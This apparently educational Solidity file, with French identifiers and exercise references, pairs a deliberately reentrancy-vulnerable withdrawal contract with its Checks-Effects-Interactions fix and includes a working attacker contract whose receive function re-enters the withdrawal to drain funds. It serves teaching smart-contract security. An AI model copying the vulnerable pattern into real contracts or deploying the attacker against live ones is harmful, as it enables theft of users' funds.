// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title ReentrancyVulnerable
 * @notice Vulnerable to Reentrancy: sends ETH before zeroing user balance.
 */
contract ReentrancyVulnerable {
    mapping(address => uint256) public soldes;

    function deposer() public payable {
        soldes[msg.sender] += msg.value;
    }

    function retirer() public {
        uint256 montant = soldes[msg.sender];
        require(montant > 0, "Solde insuffisant");

        // VULNERABILITY (Q3.7): External call occurs BEFORE state update!
        (bool ok, ) = msg.sender.call{value: montant}("");
        require(ok, "Transfert echoue");

        soldes[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title ReentrancySecurise
 * @notice Fixed using the Checks-Effects-Interactions (CEI) pattern.
 */
contract ReentrancySecurise {
    mapping(address => uint256) public soldes;

    function deposer() public payable {
        soldes[msg.sender] += msg.value;
    }

    function retirer() public {
        // 1. CHECKS
        uint256 montant = soldes[msg.sender];
        require(montant > 0, "Solde insuffisant");

        // 2. EFFECTS (Q3.8: Update state BEFORE interacting with external contract)
        soldes[msg.sender] = 0;

        // 3. INTERACTIONS
        (bool ok, ) = msg.sender.call{value: montant}("");
        require(ok, "Transfert echoue");
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title AttaquantReentrancy
 * @notice Malicious contract demonstrating the reentrancy exploit.
 */
contract AttaquantReentrancy {
    ReentrancyVulnerable public cible;

    constructor(address payable _cible) {
        cible = ReentrancyVulnerable(_cible);
    }

    // Fallback/receive function re-enters cible.retirer() while balance is not yet 0
    receive() external payable {
        if (address(cible).balance >= 1 ether) {
            cible.retirer();
        }
    }

    function attaquer() external payable {
        require(msg.value >= 1 ether, "Requires at least 1 ether");
        cible.deposer{value: 1 ether}();
        cible.retirer();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
